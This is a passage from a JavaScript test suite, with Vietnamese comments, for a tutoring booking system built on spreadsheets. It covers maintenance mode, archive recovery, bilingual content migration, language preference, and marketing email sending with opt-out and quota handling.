  assert.ok(again.ok && again.replay && again.data[0].ok, 'nhận đúng kết quả cũ: ' + JSON.stringify(again));
  assert.strictEqual(api.apiStudentBook(s, [{ date: K(15, 10), slot: '19:00' }], 'rid_maint_replay2').reason, 'MAINT_READONLY', 'lượt mới vẫn bị chặn');
  const h = api.apiStudentHome(s);
  assert.ok(h.ok && h.maint && h.maint.mode === 'READONLY', 'r.maint cho trang');
  api.setMaintMode_('OFF', 'test');
  assert.ok(!('maint' in api.apiStudentHome(s)), 'tắt: không có r.maint');
  ['a.maint_readonly', 'a.maint_closed', 'a.maint_title'].forEach(k => assert.ok(api.DEFAULT_CONTENT_[k] && api.DEFAULT_CONTENT_[k][0] && api.DEFAULT_CONTENT_[k][1], 'thiếu ' + k));
  assert.ok(/\{until\}/.test(api.DEFAULT_CONTENT_['a.maint_readonly'][0]) && /\{until\}/.test(api.REASON_TEXT_EN_.MAINT_CLOSED));
});

t('I92', 'Bỏ dòng an toàn (soát R3): lệnh ghi bị từ chối thì lần dọn sau không xoá gì; tab bị sắp xếp sau khi hỏng thì không tự xoá, báo Khẩn; sao lưu đêm bỏ lượt vì bận thì không lưu trữ; bộ đệm hỏng vẫn qua cổng bảo trì; link dời đúng khi có hàng trống', () => {
  const c = mk(), { api, env } = c;
  archiveSetup(c);
  const ids0 = c.rows('BOOKINGS').map(b => b.booking_id);
  // N1: setValues của BOOKINGS bị từ chối giữa lúc bỏ dòng
  env.state.failSetValuesOnce = 'BOOKINGS';
  let e1 = null; try { api.withLock_(() => api.archiveTabInLock_('BOOKINGS', api.getNow_(), api.archiveCutoffs_(api.getNow_()), 3000)); } catch (e) { e1 = e.message; }
  assert.ok(/timed out/.test(e1), e1);
  assert.ok(env.state.props.PURGE_OPEN_BOOKINGS, 'mốc còn');
  api.withLock_(() => api.purgeRecover_('BOOKINGS'));
  const ids1 = c.rows('BOOKINGS').map(b => b.booking_id);
  assert.deepStrictEqual(ids1.slice().sort(), ids0.slice().sort(), 'lệnh ghi không chạy: lần dọn không xoá dòng nào');
  assert.ok(c.rows('ACTIVITY_LOG').some(l => l.action === 'PURGE_RECOVERED' && /not_written/.test(l.detail)));
  // N2: hỏng ở bước xoá đuôi, rồi admin sắp xếp tab trước lần dọn
  env.state.failClearOnce = true;
  try { api.withLock_(() => api.archiveTabInLock_('BOOKINGS', api.getNow_(), api.archiveCutoffs_(api.getNow_()), 3000)); } catch (e) { }
  assert.ok(env.state.props.PURGE_OPEN_BOOKINGS);
  const sh = env.state.spreadsheets.DB_STAGING_TEST.sheets.BOOKINGS;
  const body = sh.values.slice(1).filter(r => r.some(x => x !== '' && x !== null && x !== undefined)).reverse();
  sh.values = [sh.values[0]].concat(body);
  const before2 = c.rows('BOOKINGS').length;
  api.withLock_(() => api.purgeRecover_('BOOKINGS'));
  assert.strictEqual(c.rows('BOOKINGS').length, before2, 'tab đã bị sửa: không tự xoá');
  assert.ok(c.rows('NOTIFICATIONS').some(n => n.event === 'PURGE_CHECK' && n.level === 'CRITICAL'), 'báo Khẩn');
  ids0.filter(id => id !== 'BK900007').forEach(id => assert.ok(c.rows('BOOKINGS').some(b => b.booking_id === id), 'không mất ' + id));
  // N3: sao lưu đêm bỏ lượt vì bận: không có mốc đã sao, lưu trữ không chạy
  c.at('2026-10-13 02:10'); env.state.lockBusy = true; api.nightlyBackup(); env.state.lockBusy = false;
  assert.ok(env.state.props.HB_nightlyBackup && !env.state.props.BACKUP_OK_AT, 'bận: có nhịp, chưa có bản sao');
  c.at('2026-10-13 03:10');
  assert.deepStrictEqual(api.hourlyJob().archive, { skipped: 'NO_BACKUP' });
  // N4: đang READONLY, CacheService hỏng: lượt đặt vẫn bị chặn
  const s = tokenFor(c, 'S003');
  api.setMaintMode_('READONLY', 'test');
  const realCache = env.globals.CacheService.getScriptCache;
  let calls = 0; env.globals.CacheService.getScriptCache = () => { calls++; if (calls > 0) throw new Error('Cache lỗi (giả lập)'); return realCache(); };
  let rb; try { rb = api.apiStudentBook(s, [{ date: K(15, 10), slot: '19:00' }], 'rid_cache_fail01'); } finally { env.globals.CacheService.getScriptCache = realCache; }
  api.setMaintMode_('OFF', 'test');
  assert.strictEqual(rb.reason, 'MAINT_READONLY', JSON.stringify(rb));
});
t('I93', 'Link "mở đúng dòng" dời đúng khi tab có hàng trống ở giữa (soát R3 N6)', () => {
  const c = mk(), { api, env } = c;
  archiveSetup(c);
  const sh = env.state.spreadsheets.DB_STAGING_TEST.sheets.AVAILABILITY;
  // Chèn 1 hàng trống phía trên dòng AV900002
  api.clearDbCache_();
  const row0 = api.table_('AVAILABILITY').byId('AV900002')._row;
  sh.values.splice(row0 - 1, 0, []);
  api.clearDbCache_();
  const row1 = api.table_('AVAILABILITY').byId('AV900002')._row;
  assert.strictEqual(row1, row0 + 1);
  api.withLock_(() => api.table_('NOTIFICATIONS').insert({ notif_id: 'N9300001', time: new Date(2026, 9, 11), level: 'WARNING', event: 'TUTOR_CANCEL_REQUEST', channel: 'EMAIL', message: 'x', link: api.rowLink_('AVAILABILITY', row1), read: false }));
  c.at('2026-10-12 12:00');
  api.withLock_(() => api.archiveTabInLock_('AVAILABILITY', api.getNow_(), api.archiveCutoffs_(api.getNow_()), 3000));
  api.clearDbCache_();
  const now = api.table_('AVAILABILITY').byId('AV900002')._row, link = api.table_('NOTIFICATIONS').byId('N9300001').link;
  assert.ok(link.endsWith('&range=A' + now), 'link ' + link + ' phải trỏ hàng ' + now);
});

t('I94', 'Bảo trì (soát R1 L3, đổi 5J): buổi quá hạn chọn kết quả vẫn được báo đỏ khi đang bảo trì nhưng không chuyển Không hoàn thành; tắt bảo trì thì tutor còn đủ 24 giờ rồi mới chuyển', () => {
  const c = mk(), { api } = c;
  const r = c.book('S003', [[K(14, 10), '19:00']])[0];
  assert.ok(r.ok);
  c.at('2026-10-15 20:30');
  api.setMaintMode_('READONLY', 'test');
  api.hourlyJob();
  assert.strictEqual(c.row('BOOKINGS', r.bookingId).status, 'CONFIRMED', 'đang bảo trì: không tự Hoàn thành');
  // 5J: không còn tự Hoàn thành. Bảo trì vẫn báo đỏ nhưng tạm dừng bước chuyển Không hoàn thành.
  c.at('2026-10-16 20:30'); api.hourlyJob();
  assert.strictEqual(c.row('BOOKINGS', r.bookingId).status, 'CONFIRMED', 'đang bảo trì: không chuyển Không hoàn thành dù quá 48 giờ');
  assert.ok(c.row('BOOKINGS', r.bookingId).result_notice_at instanceof Date, 'vẫn báo đỏ');
  api.setMaintMode_('OFF', 'test');
  // Soát 5J M2: lượt bảo trì cuối (16/10 20:30) dời mốc báo đỏ: tutor còn đủ 24 giờ sau khi mở lại
  c.at('2026-10-16 21:30'); api.hourlyJob();
  assert.strictEqual(c.row('BOOKINGS', r.bookingId).status, 'CONFIRMED', 'vừa tắt bảo trì: chưa chuyển');
  c.at('2026-10-17 20:35'); api.hourlyJob();
  assert.strictEqual(c.row('BOOKINGS', r.bookingId).status, 'NOT_COMPLETED');
});

t('I95', 'Lô lưu trữ BOOKINGS hỏng ở bước xoá đuôi: lượt sau dọn đuôi, đóng lô, vẫn ghi mốc tháng đã chuyển cho báo cáo (soát R3 L1)', () => {
  const c = mk(), { api, env } = c;
  archiveSetup(c);
  env.state.failClearOnce = true;
  try { api.withLock_(() => api.archiveTabInLock_('BOOKINGS', api.getNow_(), api.archiveCutoffs_(api.getNow_()), 3000)); } catch (e) { }
  assert.ok(env.state.props.ARCH_OPEN_BOOKINGS && env.state.props.PURGE_OPEN_BOOKINGS);
  delete env.state.props.ARCH_CUTOFF_MAIN;
  const rec = api.withLock_(() => api.archiveTabInLock_('BOOKINGS', api.getNow_(), api.archiveCutoffs_(api.getNow_()), 3000));
  assert.ok(rec.recovered, JSON.stringify(rec));
  assert.ok(Number(env.state.props.ARCH_CUTOFF_MAIN) > 0, 'mốc tháng đã chuyển');
  const ids = c.rows('BOOKINGS').map(b => b.booking_id);
  assert.strictEqual(ids.length, new Set(ids).size, 'không còn dòng trùng');
  assert.ok(ids.indexOf('BK900007') === -1);
});


// ── Chunk 5H: song ngữ, tab CONTENT mới, chọn ngôn ngữ, email marketing ──

t('I96', 'Tab CONTENT bản cũ (cột value) tự chuyển sang bản song ngữ: tab cũ đổi tên CONTENT_CU_808 và ẩn (không xoá); chữ admin đã sửa sang đúng cột vi hoặc en; key bỏ được báo; chạy lại không đổi gì', () => {
  const { api, env } = freshEnv();
  const ss = env.state.spreadsheets.NEW_DB;
  const old = [['key', 'value', 'default_value', 'note'],
    ['h.hero_title', 'Tiêu đề cũ admin', 'Luyện nói tiếng Thái 1:1 với người bản xứ', ''],
    ['h.form_title', 'Đăng ký gói học', 'Đăng ký gói học', ''],
    ['t.tab_avail', 'My free time', 'Availability', ''],
    ['a.network_error_en', 'No internet!', 'Cannot connect. Check your network and try again.', ''],
    ['re.BUSY', 'Busy (edited)', 'x', ''], ['r.BUSY', 'Bận (sửa)', 'y', ''],
    ['a.zalo_vi', 'Chat Zalo', 'Nhắn Zalo admin', ''],
    ['s.devices_title', 'Thiết bị', '', ''],
    ['h.hero_sub', '-', 'Chọn giờ rảnh', '']];
  ss.sheets.CONTENT = { values: old.map(r => r.slice()), formats: {}, maxRows: 1000, maxCols: 26 };
  const r = api.setupFirstRun();
  assert.ok(ss.sheets.CONTENT_CU_808 && ss.sheets.CONTENT_CU_808.hidden, 'tab cũ đổi tên và ẩn');
  assert.deepStrictEqual(ss.sheets.CONTENT_CU_808.values.slice(0, old.length), old, 'tab cũ giữ nguyên dữ liệu');
  assert.deepStrictEqual(ss.sheets.CONTENT.values[0], api.SCHEMA.CONTENT.cols, 'tab mới đúng cột');
  assert.ok(r.lines.some(l => /Chép 7 chữ admin đã sửa/.test(l) && /s\.devices_title/.test(l)), r.lines.join('\n'));
  api.clearDbCache_(); api.clearContentCache_();
  const m = api.contentMap_();
  assert.deepStrictEqual(m['h.hero_title'], ['Tiêu đề cũ admin', '1:1 Thai speaking practice with native tutors']);
  assert.strictEqual(m['h.form_title'][0], api.DEFAULT_CONTENT_['h.form_title'][0], 'chữ chưa sửa dùng chữ gốc mới');
  assert.deepStrictEqual(m['t.tab_avail'], ['Giờ rảnh', 'My free time'], 'chữ tutor cũ là tiếng Anh');
  assert.strictEqual(m['a.network_error'][1], 'No internet!');
  assert.deepStrictEqual(m['r.BUSY'], ['Bận (sửa)', 'Busy (edited)']);
  assert.strictEqual(m['a.zalo'][0], 'Chat Zalo');
  assert.strictEqual(m['h.hero_sub'][0], '', 'dấu - giữ nghĩa ẩn');
  const n = api.table_('CONTENT').all().length;
  assert.strictEqual(n, Object.keys(api.contentDefaults_()).length);
  // Admin tự thêm một cột tên value vào tab mới: không được coi là tab cũ
  ss.sheets.CONTENT.values[0].push('value');
  const r2 = api.setupFirstRun();
  assert.ok(!r2.lines.some(l => /CONTENT_CU|Chép/.test(l)), 'chạy lại không chuyển lần nữa');
  assert.ok(!ss.sheets.CONTENT_CU_808_2);
  api.clearDbCache_();
  assert.strictEqual(api.table_('CONTENT').byId('h.hero_title').vi, 'Tiêu đề cũ admin', 'chạy lại không ghi đè chữ đã sửa');
  // Mọi dòng có trang, vị trí, lúc xuất hiện cho admin điều hướng
  const missing = api.table_('CONTENT').all().filter(x => !x.page || !x.position || !x.shown_when).map(x => x.key);
  assert.deepStrictEqual(missing, [], 'thiếu giải thích: ' + missing.join(', '));
  assert.ok(api.table_('MARKETING_EMAILS').byId('VI_DU'), 'có dòng ví dụ marketing');
});

t('I97', 'Chọn ngôn ngữ: apiSetLanguage lưu USERS.lang (5K: không ghi nhật ký); đăng nhập bằng link trả lang; bảo trì chặn ghi; email đặt lịch theo ngôn ngữ người nhận ở trên', () => {
  const c = mk(), { api } = c;
  const tok = tokenFor(c, 'S003');
  const bad = api.apiSetLanguage(tok, 'fr');
  assert.strictEqual(bad.reason, 'INVALID_INPUT');
  assert.ok(bad.msg && bad.msg.vi && bad.msg.en, 'câu báo lỗi cả hai thứ tiếng');
  assert.strictEqual(api.apiSetLanguage('sai', 'en').reason, 'SESSION_INVALID');
  assert.ok(api.apiSetLanguage(tok, 'EN').ok);
  assert.strictEqual(c.row('USERS', 'S003').lang, 'en');
  const logs = () => c.rows('ACTIVITY_LOG').filter(l => l.action === 'LANG_SET').length;
  assert.strictEqual(logs(), 0, '5K: đổi ngôn ngữ không ghi nhật ký');
  api.apiSetLanguage(tok, 'en');
  assert.strictEqual(logs(), 0);
  assert.strictEqual(api.apiStudentHome(tok).data.profile.lang, 'en');
  assert.strictEqual(api.apiExchangeToken(linkFor(c, 'S003'), UA_WIN).data.lang, 'en');
  assert.strictEqual(api.apiExchangeToken(linkFor(c, 'S005'), UA_WIN).data.lang, '', 'chưa chọn: trống (trang sẽ hỏi)');
  // Email: học viên chọn tiếng Anh thì tiếng Anh ở trên; tutor chọn tiếng Việt thì tiếng Việt ở trên
  const tt = tokenFor(c, 'T001');
  assert.ok(api.apiSetLanguage(tt, 'vi').ok);
  assert.strictEqual(api.apiTutorHome(tt).data.profile.lang, 'vi');
  c.onlyOpen(K(14, 10), '19:00', ['T001']);
  const [b] = c.book('S003', [[K(14, 10), '19:00']]);
  assert.ok(b.ok);
  const sm = c.mailsTo(EMAIL.S003).slice(-1)[0], tm = c.mailsTo(EMAIL.T001).slice(-1)[0];
  assert.ok(/^1 lesson\(s\) confirmed \| Xác nhận 1 buổi học/.test(sm.subject), sm.subject);
  assert.ok(sm.htmlBody.indexOf('Hi ') < sm.htmlBody.indexOf('Tiếng Việt'), 'thân email tiếng Anh trước');
  assert.ok(/^[^|]*[ăâđêôơưạảấầẩẫậắằẳẵặẹẻẽếềểễệỉịọỏốồổỗộớờởỡợụủứừửữựỳỵỷỹ]/i.test(tm.subject), 'tutor chọn tiếng Việt: tiêu đề tiếng Việt trước: ' + tm.subject);
  // Bảo trì chỉ xem: không ghi
  api.setMaintMode_('READONLY', 'test');
  assert.strictEqual(api.apiSetLanguage(tok, 'vi').reason, 'MAINT_READONLY');
  api.setMaintMode_('OFF', 'test');
  assert.strictEqual(c.row('USERS', 'S003').lang, 'en');
});

function mkt(c, row) { c.api.withLock_(() => { const t = c.api.table_('MARKETING_EMAILS'), r = t.byId(row.campaign_id); if (r) t.update(r, row); else t.insert(row); }); c.api.clearDbCache_(); }
function mktMails(c, id) { return c.rows('MAIL_LOG').filter(m => m.kind === 'MKT:' + id); }

t('I98', 'Email marketing: nháp không gửi được; gửi thử cho mình không tính; gửi thật đúng nhóm, bỏ người từ chối và địa chỉ thử tải, ngôn ngữ người nhận ở trên, có chân từ chối; chạy lại không gửi trùng; người mới vào thì chỉ gửi người mới', () => {
  const c = mk(), { api, env } = c;
  mkt(c, { campaign_id: 'TET2027', status: 'DRAFT', audience: 'ACTIVE_STUDENTS', subject_vi: 'Ưu đãi Tết cho {{name}}', title_vi: 'Tết', body_vi: 'Chào **{{name}}**\n\n{{button:renew_url|Gia hạn}}',
    subject_en: 'Tet offer for {{name}}', title_en: 'Tet', body_en: 'Hi {{name}}\n\n{{button:renew_url|Renew}}' });
  let p = api.marketingPlan_('tet2027');
  assert.ok(!p.ok && /READY/.test(p.errors.join()), 'nháp: ' + JSON.stringify(p));
  const t1 = api.marketingTest_('TET2027', 'qa@test.vn');
  assert.ok(t1.ok, JSON.stringify(t1));
  const tm = c.mailsTo('qa@test.vn').slice(-1)[0];
  assert.ok(/^\[THỬ · TEST\] Ưu đãi Tết cho .+ \| Tet offer/.test(tm.subject), tm.subject);
  assert.ok(/page=renew/.test(tm.htmlBody) && /ngừng gửi/.test(tm.htmlBody), 'nút gia hạn và chân từ chối');
  assert.strictEqual(mktMails(c, 'TET2027').length, 0, 'gửi thử không tính là đã gửi');
  mkt(c, { campaign_id: 'TET2027', body_vi: 'Chào {{ten}}' });
  assert.ok(/\{\{ten\}\}/.test(api.marketingCheck_(api.marketingRow_('TET2027'), true).errors.join()), 'biến lạ bị chặn');
  mkt(c, { campaign_id: 'TET2027', status: 'READY', body_vi: 'Chào **{{name}}**\n\n{{button:renew_url|Gia hạn}}' });
  api.withLock_(() => { const u = api.table_('USERS'); u.update(u.byId('S005'), { marketing_opt_out: 'TRUE' }); u.update(u.byId('S003'), { lang: 'en' });
    u.insert({ user_id: 'S090', role: 'STUDENT', email: 'lt0090@loadtest.invalid', name: 'Giả', status: 'ACTIVE' });
    api.table_('STUDENT_PACKAGES').insert({ sp_id: 'SP09090', student_id: 'S090', package_code: 'PASS_1M', status: 'ACTIVE', purchased_at: new Date(2026, 9, 1) }); });
  api.clearDbCache_();
  p = api.marketingPlan_('TET2027');
  assert.ok(p.ok, JSON.stringify(p));
  const who = api.marketingRecipients_('ACTIVE_STUDENTS').map(u => u.user_id).sort();
  assert.deepStrictEqual(who, ['S001', 'S002', 'S003', 'S004', 'S007', 'S008'], 'còn gói, bỏ S005 từ chối, S006 hết gói, địa chỉ thử tải');
  assert.strictEqual(p.todo, 6);
  const r = api.marketingSend_('TET2027', 'test');
  assert.ok(r.ok && r.sent === 6 && !r.stopped, JSON.stringify(r));
  assert.strictEqual(mktMails(c, 'TET2027').length, 6);
  const row = c.row('MARKETING_EMAILS', 'TET2027');
  assert.strictEqual(row.status, 'SENT'); assert.strictEqual(Number(row.sent_count), 6); assert.ok(/gửi 6/.test(row.last_result));
  const s3 = c.mailsTo(EMAIL.S003).slice(-1)[0];
  assert.ok(/^Tet offer for Học viên 3 \| Ưu đãi Tết/.test(s3.subject), 'S003 chọn tiếng Anh: ' + s3.subject);
  assert.strictEqual(c.mailsTo(EMAIL.S005).filter(m => /Tết|Tet/.test(m.subject)).length, 0);
  assert.ok(c.rows('ACTIVITY_LOG').some(l => l.action === 'MARKETING_SENT' && l.entity_id === 'TET2027'));
  // Đã gửi xong: không gửi lại; đổi READY mà không có ai mới: không có gì để gửi
  assert.ok(/SENT/.test(api.marketingPlan_('TET2027').errors.join()));
  mkt(c, { campaign_id: 'TET2027', status: 'READY' });
  assert.strictEqual(api.marketingPlan_('TET2027').todo, 0);
  api.withLock_(() => { api.table_('USERS').insert({ user_id: 'S009', role: 'STUDENT', email: 's009@student.test', name: 'Học viên 9', status: 'ACTIVE' });
    api.table_('STUDENT_PACKAGES').insert({ sp_id: 'SP00009', student_id: 'S009', package_code: 'PASS_1M', status: 'INACTIVE', purchased_at: new Date(2026, 9, 11) }); });
  api.clearDbCache_();
  const r2 = api.marketingSend_('TET2027', 'test');
  assert.strictEqual(r2.sent, 1);
  assert.strictEqual(c.mailsTo('s009@student.test').length, 1);
  assert.strictEqual(mktMails(c, 'TET2027').length, 7);
  // Nhóm khác
  assert.deepStrictEqual(api.marketingRecipients_('EXPIRED_STUDENTS').map(u => u.user_id), ['S006']);
  assert.strictEqual(api.marketingRecipients_('TUTORS').length, 4);
  assert.ok(api.marketingRecipients_('ALL').every(u => u.role !== 'ADMIN'));
  // Chỉ một thứ tiếng
  mkt(c, { campaign_id: 'VIONLY', status: 'READY', audience: 'TUTORS', subject_vi: 'Chỉ tiếng Việt', body_vi: 'Chào {{name}}' });
  const c1 = api.marketingCheck_(api.marketingRow_('VIONLY'), false);
  assert.ok(c1.ok && /tiếng Việt/.test(c1.warnings.join()), JSON.stringify(c1));
  api.marketingSend_('VIONLY', 'test');
  const vm = c.mailsTo(EMAIL.T001).slice(-1)[0];
  assert.strictEqual(vm.subject, 'Chỉ tiếng Việt');
  assert.ok(!/English/.test(vm.htmlBody) && /Chào Vân/.test(vm.htmlBody), 'không có nửa tiếng Anh trống');
});

t('I99', 'Email marketing an toàn hạn mức và thời gian: dừng khi còn đúng phần giữ lại cho email hệ thống, trạng thái SENDING; chạy lại gửi tiếp không trùng; quá thời gian thì dừng; menu hỏi lại kèm số người, Không thì không gửi', () => {
  const c = mk(), { api, env } = c;
  mkt(c, { campaign_id: 'ALLST', status: 'READY', audience: 'ALL_STUDENTS', subject_vi: 'Tin mới', body_vi: 'Chào {{name}}', subject_en: 'News', body_en: 'Hi {{name}}' });
  const total = api.marketingRecipients_('ALL_STUDENTS').length;
  assert.strictEqual(total, 8);
  env.state.mailQuota = env.state.mails.length + 100 + 3;   // còn 103, giữ 100: gửi được 3
  let r = api.marketingSend_('ALLST', 'test');
  assert.strictEqual(r.sent, 3); assert.strictEqual(r.stopped, 'QUOTA');
  let row = c.row('MARKETING_EMAILS', 'ALLST');
  assert.strictEqual(row.status, 'SENDING'); assert.ok(/hạn mức/.test(row.last_result), row.last_result);
  const pl = api.marketingPlan_('ALLST');
  assert.strictEqual(pl.already, 3); assert.strictEqual(pl.canSend, 0);
  env.state.mailQuota = 1500;
  r = api.marketingSend_('ALLST', 'test');
  assert.strictEqual(r.sent, 5); assert.strictEqual(r.remaining, 0);
  const tos = mktMails(c, 'ALLST').map(m => m.to);
  assert.strictEqual(tos.length, 8); assert.strictEqual(new Set(tos).size, 8, 'không ai nhận 2 lần');
  assert.strictEqual(c.row('MARKETING_EMAILS', 'ALLST').status, 'SENT');
  // Quá thời gian một lượt
  mkt(c, { campaign_id: 'SLOW', status: 'READY', audience: 'TUTORS', subject_vi: 'A', body_vi: 'B' });
  // Đồng hồ thật nhảy 5 phút mỗi lần đọc: lượt gửi phải dừng trước 6 phút của Google
  const realNow = Date.now; let tick = 0;
  Date.now = () => realNow() + (tick++) * 300000;
  try { r = api.marketingSend_('SLOW', 'test'); } finally { Date.now = realNow; }
  assert.strictEqual(r.stopped, 'TIME', JSON.stringify(r)); assert.strictEqual(r.sent, 0);
  assert.strictEqual(c.row('MARKETING_EMAILS', 'SLOW').status, 'SENDING');
  // Menu: bấm Không thì không gửi; bấm Có thì gửi và báo kết quả
  env.state.uiScript = [{ text: 'slow' }, { button: 'NO' }];
  api.menuMarketingSend();
  assert.strictEqual(mktMails(c, 'SLOW').length, 0);
  assert.ok(env.state.uiLog.some(x => /TUTORS: 4 người, đã nhận trước 0, còn 4/.test(x.msg)), JSON.stringify(env.state.uiLog.slice(-2)));
  env.state.uiScript = [{ text: 'SLOW' }, { button: 'YES' }];
  api.menuMarketingSend();
  assert.strictEqual(mktMails(c, 'SLOW').length, 4);
  assert.ok(env.state.uiLog.some(x => /gửi 4, xong/.test(x.title + x.msg)));
  env.state.uiScript = [{ text: 'VI_DU_KHONG_CO' }];
  api.menuMarketingSend();
  assert.ok(env.state.uiLog.some(x => /không có chiến dịch này/.test(x.title + x.msg)));
  env.state.uiScript = [{ text: 'SLOW' }];
  api.menuMarketingTest();
  assert.ok(env.state.uiLog.some(x => /Đã gửi thử tới/.test(x.title + x.msg)));
});

t('I100', 'Nút kiểm tra nội dung (5H): báo chữ CONTENT làm mất {bien}, danh sách cách nhau | sai số mục, chiến dịch marketing READY có lỗi; câu báo lỗi nhiều mã và lỗi phiên có đủ hai thứ tiếng', () => {
  const c = mk(), { api } = c;
  setContent(c, 's.pass_left', 'Còn vài buổi', 'vi');
  setContent(c, 'a.dow', 'Sun|Mon|Tue', 'en');
  setContent(c, 'h.levels', 'A|B|C', 'vi');
  mkt(c, { campaign_id: 'LOI', status: 'READY', audience: 'NHOM_SAI', subject_vi: 'x', body_vi: '' });
  const w = api.refreshContent_().warnings.join('\n');
  assert.ok(/s\.pass_left \(vi\).*\{left\}/.test(w), w);
  assert.ok(/a\.dow: cần đúng 7 mục/.test(w), w);
  assert.ok(/h\.levels: cần cùng số mục/.test(w), w);
  assert.ok(/MARKETING_EMAILS LOI: audience không hợp lệ/.test(w) && /thiếu body_vi/.test(w), w);
  const reg = api.apiSubmitRegistration({ name: '', email: 'sai', package_code: 'PASS_1M', consent: false });
  assert.ok(!reg.ok && reg.reasons.length >= 2 && reg.msg.vi.split('. ').length >= 2 && reg.msg.en && reg.message === reg.msg.vi, JSON.stringify(reg));
  const s = api.apiStudentHome('sai');
  assert.ok(/^Phiên đăng nhập/.test(s.msg.vi) && /^Your session/.test(s.msg.en));
});


t('I101', 'Soát 5H S1: menu 1 bị cắt ngay sau khi đổi tên tab CONTENT cũ; lần chạy sau vẫn chép chữ admin đã sửa (đánh dấu ghi chú để xem lại); tiêu đề cột có khoảng trắng vẫn nhận ra', () => {
  const { api, env } = freshEnv();
  const ss = env.state.spreadsheets.NEW_DB;
  ss.sheets.CONTENT = { values: [['key', 'value ', 'default_value', 'note'], ['h.hero_title', 'Tiêu đề admin đã sửa', 'Luyện nói tiếng Thái 1:1 với người bản xứ', ''], ['a.zalo_vi', 'Chat Zalo', 'Nhắn Zalo admin', '']], formats: {}, maxRows: 1000, maxCols: 26 };
  // Lượt 1 hỏng ngay sau bước đổi tên (giả lập: khoá bận ở bước gieo chữ)
  const sp = env.globals.SpreadsheetApp.getActive();
  const name = api.contentDetachOld_(sp);
  assert.strictEqual(name, 'CONTENT_CU_808', 'tiêu đề "value " có khoảng trắng vẫn là tab cũ');
  assert.ok(/^PENDING:/.test(env.state.props.MIG_CONTENT_809_NEW_DB));
  // Lượt 2 (menu 1 chạy lại từ đầu): không còn tab CONTENT cũ nhưng vẫn chép từ tab đã đổi tên.
  const r = api.setupFirstRun();
  assert.ok(r.lines.some(l => /Chép 2 chữ admin đã sửa từ tab CONTENT_CU_808/.test(l) && /h\.hero_title \(vi\)/.test(l)), r.lines.join('\n'));
  assert.strictEqual(env.state.props.MIG_CONTENT_809_NEW_DB, 'DONE');
  api.clearDbCache_(); api.clearContentCache_();
  assert.strictEqual(api.contentMap_()['h.hero_title'][0], 'Tiêu đề admin đã sửa');
  assert.strictEqual(api.contentMap_()['a.zalo'][0], 'Chat Zalo');
  assert.ok(/Chép từ bản 8\.0\.8/.test(api.table_('CONTENT').byId('h.hero_title').note), 'ghi chú để admin xem lại');
  const r3 = api.setupFirstRun();
  assert.ok(!r3.lines.some(l => /Chép/.test(l)), 'đã xong thì không chép lại');
  // Soát 5H B3: lượt chép bù không đè chữ admin đã sửa ngay trong tab mới
  api.withLock_(() => { const t = api.table_('CONTENT'); t.update(t.byId('a.zalo'), { vi: 'Zalo mới sửa' }); });
  env.state.props.MIG_CONTENT_809_NEW_DB = 'PENDING:CONTENT_CU_808';
  const r4 = api.setupFirstRun();
  assert.ok(r4.lines.some(l => /giữ chữ đã sửa ở tab mới: .*a\.zalo \(vi\)/.test(l)), r4.lines.join('\n'));
  api.clearDbCache_();
  assert.strictEqual(api.table_('CONTENT').byId('a.zalo').vi, 'Zalo mới sửa');
  // Khoá theo từng file: file khác không đụng việc chép của file này (soát 5H B2)
  assert.ok(Object.keys(env.state.props).every(k => k !== 'MIG_CONTENT_809'));
});

t('I102', 'Soát 5H S2 đến S5: hai lượt gửi cùng một chiến dịch thì lượt sau bị từ chối; admin đổi status DRAFT giữa chừng là dừng và giữ DRAFT; chân từ chối nhận luôn có kể cả khi tắt mẫu; nút chỉ nhận biến link', () => {
  const c = mk(), { api, env } = c;
  api.withLock_(() => { for (let k = 10; k < 22; k++) api.table_('USERS').insert({ user_id: 'S0' + k, role: 'STUDENT', email: 's0' + k + '@student.test', name: 'Học viên ' + k, status: 'ACTIVE' }); });
  mkt(c, { campaign_id: 'DUP', status: 'READY', audience: 'ALL_STUDENTS', subject_vi: 'Tin', body_vi: 'Chào {{name}}' });
  env.state.props.MKT_RUN_DUP = String(Date.now()) + ':khac';
  const busy = api.marketingSend_('DUP', 'test');
  assert.ok(!busy.ok && /đang có một lượt khác/.test(busy.errors[0]), JSON.stringify(busy));
  assert.strictEqual(mktMails(c, 'DUP').length, 0);
  env.state.props.MKT_RUN_DUP = String(Date.now() - 8 * 60000) + ':cu';   // dấu của lượt đã bị cắt quá 7 phút: bỏ qua
  // 20 người (2 lô 10). Admin đổi DRAFT sau email thứ 3 (giữa lô đầu): lô đầu gửi xong, lô sau không gửi
  const M = env.globals.GmailApp, real = M.sendEmail; let n = 0;
  M.sendEmail = function (...a) { real.apply(M, a); if (++n === 3) api.withLock_(() => { const t = api.table_('MARKETING_EMAILS'); t.update(t.byId('DUP'), { status: 'DRAFT' }); }); };
  let r;
  try { r = api.marketingSend_('DUP', 'test'); } finally { M.sendEmail = real; }
  assert.strictEqual(r.stopped, 'HUY', JSON.stringify(r));
  assert.strictEqual(r.sent, 10, 'dừng ở đầu lô kế tiếp');
  const row = c.row('MARKETING_EMAILS', 'DUP');
  assert.strictEqual(row.status, 'DRAFT', 'giữ DRAFT admin vừa đặt');
  assert.ok(/dừng vì status đổi thành DRAFT/.test(row.last_result), row.last_result);
  assert.ok(!env.state.props.MKT_RUN_DUP, 'xoá dấu đang gửi');
  assert.strictEqual(mktMails(c, 'DUP').length, r.sent, 'nhật ký đủ mọi email đã gửi');
  // Soát 5H B1: Google từ chối lệnh ghi MAIL_LOG một lần: thử lại, ghi đủ, không trùng; chạy lại không gửi lại ai
  mkt(c, { campaign_id: 'LOGF', status: 'READY', audience: 'ALL_STUDENTS', subject_vi: 'A', body_vi: 'B' });
  env.state.failSetValuesOnce = 'MAIL_LOG';
  const rl = api.marketingSend_('LOGF', 'test');
  assert.ok(!env.state.failSetValuesOnce, 'lỗi giả lập đã xảy ra');
  assert.ok(rl.ok && !rl.stopped, JSON.stringify(rl));
  const logs = mktMails(c, 'LOGF').map(m => m.to);
  assert.strictEqual(logs.length, rl.sent); assert.strictEqual(new Set(logs).size, logs.length, 'không ghi trùng');
  mkt(c, { campaign_id: 'LOGF', status: 'READY' });
  assert.strictEqual(api.marketingSend_('LOGF', 'test').sent, 0, 'chạy lại không gửi lại ai');
  // Dòng đã xuống Sheets rồi mới lỗi (bước flush cuối khoá): lần thử lại đọc lại MAIL_LOG, không ghi đôi
  mkt(c, { campaign_id: 'LOGG', status: 'READY', audience: 'ALL_STUDENTS', subject_vi: 'A', body_vi: 'B' });
  const SA = env.globals.SpreadsheetApp, realFlush = SA.flush; let failed = 0;
